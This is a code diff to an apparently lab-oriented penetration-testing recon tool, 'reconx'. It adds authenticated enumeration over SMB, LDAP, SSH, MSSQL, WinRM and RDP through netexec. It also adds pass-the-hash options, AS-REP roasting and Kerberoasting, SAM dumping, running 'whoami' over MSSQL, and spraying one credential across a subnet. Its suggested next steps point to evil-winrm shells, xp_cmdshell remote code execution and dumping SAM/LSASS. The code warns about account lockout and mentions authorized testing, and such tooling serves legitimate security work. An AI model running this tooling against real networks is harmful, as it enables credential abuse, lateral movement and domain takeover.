@@ -320,6 +320,58 @@ def is_web(port, name):
 
 
 # --------------------------------------------------------------------------- #
+#  Credentials - authenticated enumeration & spraying
+# --------------------------------------------------------------------------- #
+def have_creds(args):
+    return bool(getattr(args, "user", None) and (getattr(args, "password", None) is not None
+                                                 or getattr(args, "hash", None)))
+
+
+def _sh_quote(s):
+    # single-quote for the shell; harmless for values without quotes, safe for those with
+    return "'" + str(s).replace("'", "'\\''") + "'"
+
+
+def nxc_auth(args):
+    """Build the netexec/crackmapexec credential argument string from parsed args."""
+    parts = [f"-u {_sh_quote(args.user)}"]
+    if getattr(args, "hash", None):
+        parts.append(f"-H {_sh_quote(args.hash)}")
+    else:
+        parts.append(f"-p {_sh_quote(args.password)}")
+    if getattr(args, "domain", None):
+        parts.append(f"-d {_sh_quote(args.domain)}")
+    if getattr(args, "local_auth", False):
+        parts.append("--local-auth")
+    return " ".join(parts)
+
+
+def nxc_bin():
+    return "nxc" if TOOLS.get("nxc") else ("netexec" if TOOLS.get("netexec")
+            else ("crackmapexec" if TOOLS.get("crackmapexec") else None))
+
+
+def cred_label(args):
+    who = args.user
+    if getattr(args, "domain", None):
+        who = f"{args.domain}\\{args.user}"
+    secret = "<hash>" if getattr(args, "hash", None) else "<pass>"
+    scope = "local" if getattr(args, "local_auth", False) else "domain"
+    return f"{who}:{secret} ({scope})"
+
+
+def smbmap_auth(args):
+    parts = [f"-u {_sh_quote(args.user)}"]
+    if getattr(args, "hash", None):
+        parts.append(f"-p {_sh_quote(args.hash)}")   # smbmap accepts LM:NT or NT hash via -p
+    else:
+        parts.append(f"-p {_sh_quote(args.password)}")
+    if getattr(args, "domain", None):
+        parts.append(f"-d {_sh_quote(args.domain)}")
+    return " ".join(parts)
+
+
+# --------------------------------------------------------------------------- #
 #  Findings engine - regex rules over tool output
 # --------------------------------------------------------------------------- #
 FINDING_RULES = [
@@ -358,6 +410,12 @@ FINDING_RULES = [
     ("HIGH",     re.compile(r"CAPABILITY.*(LOGIN|AUTH=PLAIN|AUTH=LOGIN)|\* OK.*IMAP", re.I), "imap", "IMAP allows LOGIN/PLAIN auth - test cred reuse"),
     ("MEDIUM",   re.compile(r"STARTTLS", re.I), "mail", "STARTTLS offered - creds encrypted in transit but still testable"),
     ("INFO",     re.compile(r"Dovecot|Courier|Cyrus|UW-IMAP", re.I), "mail", "Mail server software identified (check version CVEs)"),
+    # Authenticated / credentialed results (netexec style output)
+    ("CRITICAL", re.compile(r"\(Pwn3d!\)", re.I), "creds", "ADMIN access with these credentials (Pwn3d!) - you can get a shell / dump SAM"),
+    ("HIGH",     re.compile(r"\[\+\]\s+\S+\\\S+:\S+", re.I), "creds", "Credentials VALID on this service - reuse them across every host"),
+    ("HIGH",     re.compile(r"\bSTATUS_ACCOUNT_LOCKED_OUT\b", re.I), "creds", "ACCOUNT LOCKED OUT - stop spraying this user immediately"),
+    ("MEDIUM",   re.compile(r"\bSTATUS_PASSWORD_EXPIRED\b", re.I), "creds", "Password expired but valid - may be changeable via SMB/RDP"),
+    ("INFO",     re.compile(r"\bSTATUS_LOGON_FAILURE\b", re.I), "creds", "Credentials rejected on this service"),
 ]
 
 
@@ -415,8 +473,20 @@ async def enum_web(host, port, name, runner, args, findings):
 
 async def enum_smb(host, runner, args, findings):
     tag = f"{host}/smb"
-    nxc = "nxc" if TOOLS.get("nxc") else ("netexec" if TOOLS.get("netexec") else ("crackmapexec" if TOOLS.get("crackmapexec") else None))
-    if nxc:
+    nxc = nxc_bin()
+    if nxc and have_creds(args):
+        # authenticated: check access, admin (Pwn3d!), shares, users, and loot
+        auth = nxc_auth(args)
+        for sub, extra in (("--shares", ""), ("--users", ""), ("--pass-pol", ""),
+                           ("--loggedon-users", ""), ("--sam", " (needs admin)")):
+            rc, out = await runner.run(f"{nxc} smb {host} {auth} {sub}",
+                                       f"{tag}/auth_nxc{sub.replace('-','')}.txt", f"{nxc} smb {sub}")
+            scan_findings(out, "smb", 445, findings)
+        if TOOLS.get("smbmap"):
+            rc, out = await runner.run(f"smbmap -H {host} {smbmap_auth(args)}",
+                                       f"{tag}/auth_smbmap.txt", "smbmap-auth")
+            scan_findings(out, "smb", 445, findings)
+    elif nxc:
         for sub in ("--shares", "--users", "--pass-pol"):
             rc, out = await runner.run(f"{nxc} smb {host} -u '' -p '' {sub}",
                                        f"{tag}/nxc{sub.replace('-','')}.txt", f"{nxc} smb {sub}")
@@ -454,6 +524,21 @@ async def enum_ldap(host, port, runner, args, findings):
                 f"ldapsearch -x -H ldap://{host}:{port} -b '{base}'",
                 f"{tag}/anon_dump.txt", "ldap-dump", timeout=args.enum_timeout)
             scan_findings(out2, "ldap", port, findings)
+    # authenticated: netexec LDAP enum + BloodHound collection hint
+    if have_creds(args):
+        nxc = nxc_bin()
+        if nxc:
+            auth = nxc_auth(args)
+            for sub in ("--users", "--groups", "--asreproast /tmp/asrep.txt",
+                        "--kerberoasting /tmp/kerb.txt"):
+                rc, out = await runner.run(f"{nxc} ldap {host} {auth} {sub}",
+                                           f"{tag}/auth_ldap_{sub.split()[0].strip('-')}.txt",
+                                           f"{nxc} ldap {sub.split()[0]}")
+                scan_findings(out, "ldap", port, findings)
+        dom = args.domain or "<domain>"
+        findings.append(Finding("HIGH", "ad", port,
+            f"Authenticated to LDAP - run BloodHound now: "
+            f"bloodhound-python -u {args.user} -p <pass> -d {dom} -ns {host} -c all"))
     good("ldap enum done")
 
 
@@ -479,6 +564,16 @@ async def enum_ssh(host, port, runner, args, findings):
             f"nmap -Pn -p {port} --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey -oN /dev/stdout {host}",
             f"{tag}/ssh_nse.txt", "nmap-ssh")
         scan_findings(out, "ssh", port, findings)
+    # authenticated: validate the credential over SSH via netexec (no brute; single try)
+    if have_creds(args) and not getattr(args, "hash", None):
+        nxc = nxc_bin()
+        if nxc:
+            rc, out = await runner.run(f"{nxc} ssh {host} -u {_sh_quote(args.user)} -p {_sh_quote(args.password)}",
+                                       f"{tag}/auth_nxc_ssh.txt", "nxc-ssh")
+            scan_findings(out, "ssh", port, findings)
+            if out and ("[+]" in out or "Pwn3d" in out):
+                findings.append(Finding("CRITICAL", "ssh", port,
+                    f"SSH login works: ssh {args.user}@{host}  (then sudo -l, id, enumerate)"))
     good("ssh enum done")
 
 
@@ -528,8 +623,16 @@ async def enum_nfs(host, runner, args, findings):
 
 
 async def enum_mssql(host, port, runner, args, findings):
-    nxc = "nxc" if TOOLS.get("nxc") else ("netexec" if TOOLS.get("netexec") else None)
-    if nxc:
+    nxc = nxc_bin()
+    if nxc and have_creds(args):
+        auth = nxc_auth(args)
+        rc, out = await runner.run(f"{nxc} mssql {host} {auth} -x whoami",
+                                   f"{host}/mssql/auth_nxc.txt", "nxc-mssql-auth")
+        scan_findings(out, "mssql", port, findings)
+        if out and ("[+]" in out or "Pwn3d" in out):
+            findings.append(Finding("CRITICAL", "mssql", port,
+                "MSSQL login works - enable xp_cmdshell for RCE (nxc mssql ... -x whoami / mssqlclient.py)"))
+    elif nxc:
         rc, out = await runner.run(f"{nxc} mssql {host} -u sa -p '' --local-auth",
                                    f"{host}/mssql/nxc.txt", "nxc-mssql")
         scan_findings(out, "mssql", port, findings)
@@ -552,9 +655,13 @@ async def enum_postgres(host, port, runner, args, findings):
             f"nmap -Pn -p {port} --script pgsql-brute -oN /dev/stdout {host}",
             f"{tag}/pgsql_nse.txt", "nmap-pgsql", timeout=args.enum_timeout)
         scan_findings(out, "postgres", port, findings)
-    # 2) netexec default-cred sweep (postgres:postgres, postgres:'', etc.)
-    nxc = "nxc" if TOOLS.get("nxc") else ("netexec" if TOOLS.get("netexec") else None)
-    if nxc:
+    # 2) netexec: use supplied creds if we have them, else default-cred sweep
+    nxc = nxc_bin()
+    if nxc and have_creds(args):
+        rc, out = await runner.run(f"{nxc} postgres {host} {nxc_auth(args)}",
+                                   f"{tag}/auth_nxc.txt", f"{nxc}-postgres-auth")
+        scan_findings(out, "postgres", port, findings)
+    elif nxc:
         for user, pw in (("postgres", "postgres"), ("postgres", ""), ("postgres", "password")):
             rc, out = await runner.run(
                 f"{nxc} postgres {host} -u {user} -p '{pw}'",
@@ -637,6 +744,17 @@ async def enum_imap(host, port, runner, args, findings):
 
 
 async def enum_winrm(host, port, runner, args, findings):
+    if have_creds(args):
+        nxc = nxc_bin()
+        if nxc:
+            rc, out = await runner.run(f"{nxc} winrm {host} {nxc_auth(args)}",
+                                       f"{host}/winrm/auth_nxc.txt", "nxc-winrm-auth")
+            scan_findings(out, "winrm", port, findings)
+            if out and ("[+]" in out or "Pwn3d" in out):
+                pw = "-H <hash>" if getattr(args, "hash", None) else "-p <pass>"
+                findings.append(Finding("CRITICAL", "winrm", port,
+                    f"WinRM login works -> SHELL: evil-winrm -i {host} -u {args.user} {pw}"))
+        return
     findings.append(Finding("MEDIUM", "winrm", port,
                             "WinRM open - if you get creds, use evil-winrm for a shell"))
 
@@ -650,6 +768,15 @@ async def enum_rdp(host, port, runner, args, findings):
         m = re.search(r"(DNS_Domain_Name|Target_Name|NetBIOS_Domain_Name):\s*(\S+)", out or "")
         if m:
             findings.append(Finding("MEDIUM", "rdp", port, f"RDP NTLM info leaks: {m.group(2)}"))
+    if have_creds(args):
+        nxc = nxc_bin()
+        if nxc:
+            rc, out = await runner.run(f"{nxc} rdp {host} {nxc_auth(args)}",
+                                       f"{host}/rdp/auth_nxc.txt", "nxc-rdp-auth")
+            scan_findings(out, "rdp", port, findings)
+            if out and ("[+]" in out or "Pwn3d" in out):
+                findings.append(Finding("HIGH", "rdp", port,
+                    f"RDP login works: xfreerdp /u:{args.user} /p:<pass> /v:{host} /cert:ignore"))
 
 
 # --------------------------------------------------------------------------- #
@@ -708,7 +835,7 @@ async def dispatch(host, services, runner, args, findings, host_profile):
 # --------------------------------------------------------------------------- #
 #  Reporting
 # --------------------------------------------------------------------------- #
-def print_summary(host, services, udp, findings, host_profile, elapsed):
+def print_summary(host, services, udp, findings, host_profile, elapsed, args=None):
     print()
     print(f"{C.BOLD}{'='*70}{C.END}")
     print(f"{C.BOLD}  RECONX SUMMARY  -  {host}   ({elapsed:.1f}s){C.END}")
@@ -753,16 +880,21 @@ def print_summary(host, services, udp, findings, host_profile, elapsed):
 
     # suggested next steps
     print(f"\n  {C.BOLD}SUGGESTED NEXT STEPS{C.END}")
-    for step in suggest_next(services, findings, host_profile):
+    for step in suggest_next(services, findings, host_profile, args):
         print(f"    {C.B}->{C.END} {step}")
     print(f"{C.BOLD}{'='*70}{C.END}\n")
 
 
-def suggest_next(services, findings, host_profile):
+def suggest_next(services, findings, host_profile, args=None):
     steps = []
     sev_present = {f.sev for f in findings}
     svc_present = {f.service for f in findings}
     ports = set(services)
+
+    if args is not None and have_creds(args):
+        steps.append("You have creds: SPRAY them across every host (reconx <cidr> -u .. -p .. --spray) - reuse is the fastest win.")
+        if any(re.search(r"\(Pwn3d!\)|login works|SHELL", f.text) for f in findings):
+            steps.append("Admin/shell confirmed above - get your shell, then dump SAM/LSASS or hunt for the next credential.")
 
     if host_profile["dc_signals"] >= 2:
         steps.append("AD: enumerate users via LDAP/RID, then AS-REP roast (impacket GetNPUsers) and Kerberoast.")
@@ -839,7 +971,7 @@ async def scan_host(host, runner, args):
 
     elapsed = time.time() - t0
     if not runner.dry_run:
-        print_summary(host, services, udp, findings, host_profile, elapsed)
+        print_summary(host, services, udp, findings, host_profile, elapsed, args)
         md = write_markdown(host, services, udp, findings, runner.outdir, host_profile)
         good(f"notes written: {md}")
 
@@ -855,6 +987,48 @@ def expand_targets(target):
     except ValueError:
         pass
     return [target]
+
+
+async def spray_credential(hosts, runner, args):
+    """Test ONE credential across many hosts via SMB (and WinRM). netexec accepts
+    a space-separated host list, so this is a single fast pass per protocol.
+    Deliberately sprays a SINGLE credential to avoid account lockout."""
+    nxc = nxc_bin()
+    if not nxc:
+        bad("spray needs netexec/nxc - not found.")
+        return
+    auth = nxc_auth(args)
+    targets = " ".join(hosts)
+    good(f"spraying {C.M}{cred_label(args)}{C.END} across {len(hosts)} host(s) via SMB/WinRM")
+    findings = []
+    os.makedirs(os.path.join(runner.outdir, "_spray"), exist_ok=True)
+    for proto in ("smb", "winrm"):
+        rc, out = await runner.run(f"{nxc} {proto} {targets} {auth}",
+                                   f"_spray/{proto}.txt", f"spray-{proto}",
+                                   timeout=args.scan_timeout)
+        # surface each valid host / admin
+        for line in (out or "").splitlines():
+            if "(Pwn3d!)" in line:
+                findings.append(Finding("CRITICAL", proto, None, f"ADMIN: {line.strip()}"))
+            elif re.search(r"\[\+\]", line):
+                findings.append(Finding("HIGH", proto, None, f"valid: {line.strip()}"))
+            elif "STATUS_ACCOUNT_LOCKED_OUT" in line:
+                findings.append(Finding("HIGH", "creds", None, "LOCKOUT hit - stop now"))
+                bad("account lockout detected - stopping spray"); break
+    # report
+    print(f"\n{C.BOLD}{'='*70}{C.END}")
+    print(f"{C.BOLD}  SPRAY RESULTS  -  {cred_label(args)}{C.END}")
+    print(f"{C.BOLD}{'='*70}{C.END}")
+    if findings:
+        findings.sort(key=lambda f: SEV_ORDER.get(f.sev, 9))
+        for f in findings:
+            print(f"    {SEV_COLOR.get(f.sev,'')}{f.sev:<8}{C.END} {C.DIM}{f.service}{C.END}  {f.text}")
+        print(f"\n  {C.B}->{C.END} For any (Pwn3d!) SMB host: dump SAM / secrets. "
+              f"For WinRM valid: evil-winrm -i <host> -u {args.user} ...")
+    else:
+        print(f"  {C.DIM}Credential not valid on any host via SMB/WinRM. Try other protocols "
+              f"(mssql/rdp/ssh) or another host set.{C.END}")
+    print(f"{C.BOLD}{'='*70}{C.END}\n")
 
 
 async def ping_sweep(hosts, args):
@@ -885,10 +1059,21 @@ def build_argparser():
                "  reconx 10.10.10.10\n"
                "  reconx 10.10.10.0/24 --ping-sweep --quick\n"
                "  reconx target.htb --nikto -o loot/\n"
+               "  reconx dc01.corp.htb -u alex.turner -p 'Passw0rd!' -d corp.htb\n"
+               "  reconx 10.10.10.0/24 -u svc -H <ntlm-hash> --spray\n"
                "  reconx 10.10.10.10 --dry-run",
     )
     p.add_argument("target", help="IP, hostname, or CIDR (e.g. 10.10.10.0/24)")
     p.add_argument("-o", "--outdir", default="reconx-results", help="output directory")
+    # --- credentials (authorized testing only) ---
+    cg = p.add_argument_group("credentials (authenticated enumeration)")
+    cg.add_argument("-u", "--user", help="username for authenticated enum")
+    cg.add_argument("-p", "--pass", dest="password", help="password (use --hash for NTLM)")
+    cg.add_argument("-H", "--hash", help="NTLM hash for pass-the-hash (LM:NT or :NT)")
+    cg.add_argument("-d", "--domain", help="AD domain (e.g. corp.htb)")
+    cg.add_argument("--local-auth", action="store_true", help="treat creds as LOCAL account, not domain")
+    cg.add_argument("--spray", action="store_true",
+                    help="spray the ONE credential across all hosts (CIDR) via SMB/WinRM")
     p.add_argument("--quick", action="store_true", help="top-1000 ports only (fast)")
     p.add_argument("--top-ports", type=int, help="scan only the top N common ports")
     p.add_argument("--no-udp", action="store_true", help="skip UDP scan")
@@ -938,11 +1123,31 @@ async def amain(args):
     if missing:
         warn(f"missing (modules will degrade/skip): {C.DIM}{', '.join(missing)}{C.END}")
 
+    # credential status + safety
+    if have_creds(args):
+        good(f"authenticated mode: {C.M}{cred_label(args)}{C.END}")
+        if not nxc_bin():
+            warn("no netexec/nxc found - authenticated checks need it; install netexec")
+        if not args.local_auth and not args.domain:
+            warn("no -d/--domain set with a domain account - some AD checks may fail; add -d, or --local-auth for local accounts")
+        if args.spray and not args.local_auth:
+            warn(f"{C.R}SPRAY on a DOMAIN account can trigger lockout.{C.END} "
+                 f"reconx sprays ONE credential (not many) to stay safe, but confirm the lockout policy first.")
+    elif args.spray:
+        bad("--spray needs a credential (-u with -p or -H). Ignoring.")
+        args.spray = False
+
     hosts = expand_targets(args.target)
     if len(hosts) > 1 and args.ping_sweep and not args.dry_run:
         info(f"ping-sweeping {len(hosts)} hosts...")
         hosts = await ping_sweep(hosts, args)
         good(f"{len(hosts)} host(s) alive")
+
+    # spray path: one credential across many hosts, then stop (don't full-scan the /24)
+    if args.spray and have_creds(args) and len(hosts) > 1:
+        await spray_credential(hosts, runner, args)
+        return
+
     if len(hosts) > 1:
         info(f"scanning {len(hosts)} host(s) sequentially (per-host modules run in parallel)")
 
